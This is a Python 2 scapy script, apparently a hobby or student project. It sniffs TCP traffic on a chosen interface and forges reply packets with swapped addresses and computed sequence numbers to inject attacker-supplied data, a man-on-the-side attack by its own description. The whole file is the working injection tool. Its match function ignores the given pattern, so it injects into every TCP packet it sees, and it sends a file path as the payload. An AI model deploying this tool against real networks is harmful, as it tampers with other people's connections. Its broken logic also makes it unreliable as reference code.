import sys,os, getopt, netifaces,util,logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # ro suppress all messages that have a lower level of seriousness than error messages.
from collections import deque
from datetime import *
from scapy.all import *
from copy import deepcopy


USAGE ='usage: -i <interface> -r <regexp> -d <data> expression ,OR,\nusage:                -r <regexp> -d <data> expression'

injected_Packts=0
def increment():
    global injected_Packts
    injected_Packts += 1

def check_match(regular_expression, pkt):
    #should have been :
    #try:
    #    p = re.compile(str(regular_expression))
    #except:
    #    sys.exit(1)
    #instead I used this because I have a problem with the regular_expression
    return str(pkt[TCP].payload)

def build_packet( data, pkt):

    new_pkt = deepcopy(pkt)

    # Ethernet header
    new_pkt[Ether].src, new_pkt[Ether].dst = pkt[Ether].dst, pkt[Ether].src

    # IP header
    new_pkt[IP].id = random.randint(5000, 50000)  # Random number
    new_pkt[IP].src, new_pkt[IP].dst = pkt[IP].dst, pkt[IP].src  # switch IPs
    new_pkt[IP].ttl = 64    # time to live

    # TCP header
    new_pkt[TCP].sport, new_pkt[TCP].dport = pkt[TCP].dport, pkt[TCP].sport
    new_pkt[TCP].seq = pkt.ack
    new_pkt[TCP].ack = pkt.seq + (pkt.len - pkt[IP].ihl * 4 - 20)
    new_pkt[TCP].flags = 'PA'
    new_pkt[TCP].window = 65000
    new_pkt[TCP].payload = data

    # Build the new packet to inject (SYN for target packet)
    del(new_pkt[IP].len)         # Recalculate length of IP
    del(new_pkt[IP].chksum)      # Recalculate IP checksum
    del(new_pkt[TCP].chksum)     # Recalculate TCP checksum
    increment()
    print "(%d) Injected packet IP ID: %d (corresponding %d)" \
        % (injected_Packts, new_pkt[IP].id, pkt[IP].id)
    print 'Injecting a packet with ID', new_pkt[IP].id, 'instead of packet with ID', pkt[IP].id
    print '\n'
    return new_pkt


def injection( interface, data, regular_expression, pkt):
    match = check_match(regular_expression,pkt)

    # If the pattern is found, inject the new packet!
    if match is None:
            pass
    else:
        sendp(build_packet(data,pkt), verbose=False)
        print 'Forged packet sent successfully!\n'

def main(argv):
   iflag=False
   rflag=False
   dflag=False


   try:
      opts, args = getopt.getopt(argv,"hi:r:d:")
   except getopt.GetoptError:
      print USAGE
      sys.exit(2)

   count=0;
   for opt, arg in opts:
     if opt == '-h': #help
         print USAGE
         sys.exit()
     elif opt == "-i":
         iflag=True
         interface = arg #interface
         count=count+2
     elif opt == "-r":
         rflag=True
         regular_expression = arg #Regular_EXPRESSION
         count=count+2
     elif opt == "-d":
         dflag=True
         data = arg #   data
         count=count+2

#  -r is mandatory
   if rflag == False :
          print 'Missing -r option'
          print USAGE
          exit(1)
#  -d is mandatory
   if dflag == False :
          print 'Missing -d option'
          print USAGE
          exit(1)
#  use the defualt if not given, wlan0
   if iflag == False :
        interface=netifaces.interfaces()[2]       #use the defualt if not given

#Non-option argument which is the expression at the end
   expression= argv[count:]

#printing
   print '------------------'
   print 'interface  is:', interface
   print 'Regular_EXPRESSION  is:', regular_expression
   print 'data is:', data
   sys.stdout.write('Expression:')
   for x in  expression :
     sys.stdout.write(x+' ')
   sys.stdout.write('\n')

   print '------------------'

   print 'Validating inputs'


#checking if the supplied interface is correct or not
   if interface not in [i for i in netifaces.interfaces()]:
        print 'Error, Interface - %s - is not listed in your network interfaces!!!!' % iface
        sys.exit(1)

#checking if the supplied file is correct or not
   if not os.path.isfile(data):  # True if path is an existing regular file.
       print('Error !!!!, irregular file, provide an existing regular') #Logs a message with level WARNING on this logger. The arguments are interpreted as for debug().
       sys.exit(1)

   print 'inputs are fine'
   print '------------------'


#interface, data, regular_expression, expression
   print 'Sniffing...\n'

   try:
        sniff(iface=interface, filter=expression[0], prn=lambda  x: injection(interface,data,regular_expression,x), lfilter=lambda x:x.haslayer(TCP))
   except Scapy_Exception as msg:
              print msg,'Error: something went wrong during sniffing!\n'
              sys.exit(1)

   global injected_Packts
   print '# of Injected Man in the Side Attacks is : %d' %injected_Packts


if __name__ == "__main__":
   if ( len(sys.argv) < 2):
        print 'NOT ENOUGH arguments is supplied here is the Usage !!!'
        print USAGE
        exit(1)
   main(sys.argv[1:])
